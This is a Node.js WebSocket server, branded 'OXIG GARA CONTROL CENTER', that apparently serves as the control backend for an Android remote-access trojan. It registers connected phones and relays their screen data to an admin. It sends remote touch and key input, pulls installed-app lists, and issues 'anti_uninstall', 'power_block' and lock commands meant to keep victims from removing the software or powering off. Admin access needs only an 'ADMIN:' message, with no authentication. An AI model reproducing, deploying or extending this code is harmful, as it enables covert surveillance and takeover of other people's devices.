const WebSocket = require('ws');
const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || 3000;

const server = http.createServer((req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') {
        res.writeHead(204);
        res.end();
        return;
    }
    
    if (req.url === '/' || req.url === '/index.html') {
        fs.readFile(path.join(__dirname, 'admin.html'), (err, data) => {
            if (err) {
                res.writeHead(500);
                res.end('Server Error: ' + err.message);
                return;
            }
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(data);
        });
    } else {
        res.writeHead(404);
        res.end('Not Found');
    }
});

const wss = new WebSocket.Server({ 
    server,
    // Railway এর জন্য গুরুত্বপূর্ণ
    perMessageDeflate: false
});

let admins = new Set();
let devices = new Map();

wss.on('connection', (ws, req) => {
    console.log('✅ New connection from:', req.socket.remoteAddress);
    
    ws.isAlive = true;
    
    ws.on('pong', () => {
        ws.isAlive = true;
    });
    
    let buffer = '';
    let deviceInfo = null;
    
    ws.on('message', (data) => {
        try {
            if (typeof data === 'string') {
                buffer += data;
                
                if (buffer.includes('\n')) {
                    const lines = buffer.split('\n');
                    buffer = lines.pop();
                    
                    for (const line of lines) {
                        const msg = line.trim();
                        if (!msg) continue;
                        
                        if (msg.startsWith('DEVICE:')) {
                            const parts = msg.substring(7).split('|');
                            deviceInfo = {
                                id: parts[0],
                                model: parts[2] || 'Unknown',
                                androidVersion: parts[1] || 'Unknown',
                                apiLevel: parts[3] || 'Unknown',
                                ip: req.socket.remoteAddress,
                                connectedAt: Date.now()
                            };
                            devices.set(ws, deviceInfo);
                            console.log('✅ Device registered:', deviceInfo.id);
                            ws.send('OK:REGISTERED\n');
                            broadcastToAdmins({ type: 'device_list', devices: getDeviceList() });
                        }
                        else if (msg.startsWith('ADMIN:')) {
                            admins.add(ws);
                            console.log('👤 Admin connected');
                            ws.send(JSON.stringify({ type: 'device_list', devices: getDeviceList() }));
                        }
                        else if (msg.startsWith('APPS:')) {
                            const appsJson = msg.substring(5);
                            try {
                                const apps = JSON.parse(appsJson);
                                if (deviceInfo) {
                                    deviceInfo.apps = apps;
                                    broadcastToAdmins({ type: 'device_apps', deviceId: deviceInfo.id, apps: apps });
                                }
                            } catch(e) {}
                        }
                        else if (msg === 'PONG') {}
                    }
                }
            } else {
                const buffer = Buffer.isBuffer(data) ? data : Buffer.from(data);
                if (devices.has(ws)) {
                    for (const [adminWs, deviceWs] of adminSessions.entries()) {
                        if (deviceWs === ws && adminWs.readyState === WebSocket.OPEN) {
                            adminWs.send(buffer);
                            break;
                        }
                    }
                }
            }
        } catch(e) { console.error('Error:', e.message); }
    });
    
    ws.on('close', () => {
        admins.delete(ws);
        if (devices.has(ws)) {
            const info = devices.get(ws);
            console.log('❌ Device disconnected:', info.id);
            devices.delete(ws);
            broadcastToAdmins({ type: 'device_list', devices: getDeviceList() });
        }
    });
    
    ws.on('error', (err) => {
        console.error('WebSocket error:', err.message);
    });
});

// Admin sessions
let adminSessions = new Map();

// Handle JSON commands from admin
function handleJsonMessage(ws, data) {
    try {
        const cmd = JSON.parse(data);
        
        switch(cmd.type) {
            case 'select_device':
                for (const [dws, info] of devices.entries()) {
                    if (info.id === cmd.deviceId) {
                        adminSessions.set(ws, dws);
                        ws.send(JSON.stringify({ type: 'device_selected', deviceId: cmd.deviceId }));
                        ws.send(JSON.stringify({ type: 'device_info', info: info }));
                        return;
                    }
                }
                break;
                
            case 'touch':
                const targetWs = adminSessions.get(ws);
                if (targetWs && targetWs.readyState === WebSocket.OPEN) {
                    targetWs.send(`TOUCH:${cmd.action},${cmd.x},${cmd.y}\n`);
                }
                break;
                
            case 'key':
                const keyWs = adminSessions.get(ws);
                if (keyWs && keyWs.readyState === WebSocket.OPEN) {
                    keyWs.send(`KEY:${cmd.keyCode}\n`);
                }
                break;
                
            case 'get_apps':
                const appWs = adminSessions.get(ws);
                if (appWs && appWs.readyState === WebSocket.OPEN) {
                    appWs.send('GET_APPS\n');
                }
                break;
                
            case 'anti_uninstall':
                const antiWs = adminSessions.get(ws);
                if (antiWs && antiWs.readyState === WebSocket.OPEN) {
                    antiWs.send(`ANTI_UNINSTALL:${cmd.enable ? 1 : 0}\n`);
                }
                break;
                
            case 'power_block':
                const powerWs = adminSessions.get(ws);
                if (powerWs && powerWs.readyState === WebSocket.OPEN) {
                    powerWs.send(`POWER_BLOCK:${cmd.enable ? 1 : 0}\n`);
                }
                break;
                
            case 'lock_device':
                const lockWs = adminSessions.get(ws);
                if (lockWs && lockWs.readyState === WebSocket.OPEN) {
                    lockWs.send('LOCK\n');
                }
                break;
        }
    } catch(e) {}
}

// Override message for admin
const origOnMessage = wss.options;
wss.on('connection', (ws) => {
    const origHandler = ws._events?.message;
    ws.on('message', (data) => {
        if (typeof data === 'string' && data.startsWith('{')) {
            handleJsonMessage(ws, data);
        }
    });
});

function getDeviceList() {
    const list = [];
    for (const [ws, info] of devices.entries()) {
        list.push({
            id: info.id,
            name: '📱 ' + info.id,
            model: info.model,
            androidVersion: info.androidVersion,
            apiLevel: info.apiLevel,
            ip: info.ip,
            appsCount: info.apps ? info.apps.length : 0,
            connectedAt: info.connectedAt
        });
    }
    return list;
}

function broadcastToAdmins(msg) {
    const json = JSON.stringify(msg);
    for (const client of admins) {
        if (client.readyState === WebSocket.OPEN) {
            client.send(json);
        }
    }
}

// Keep alive
setInterval(() => {
    wss.clients.forEach(ws => {
        if (!ws.isAlive) return ws.terminate();
        ws.isAlive = false;
        ws.ping();
    });
}, 25000);

server.listen(PORT, '0.0.0.0', () => {
    console.log('┌─────────────────────────────────────┐');
    console.log('│     OXIG GARA CONTROL CENTER       │');
    console.log('│     Dev By Oxig Gara                │');
    console.log('├─────────────────────────────────────┤');
    console.log(`│  Server running on port ${PORT}        │`);
    console.log('└─────────────────────────────────────┘');
});
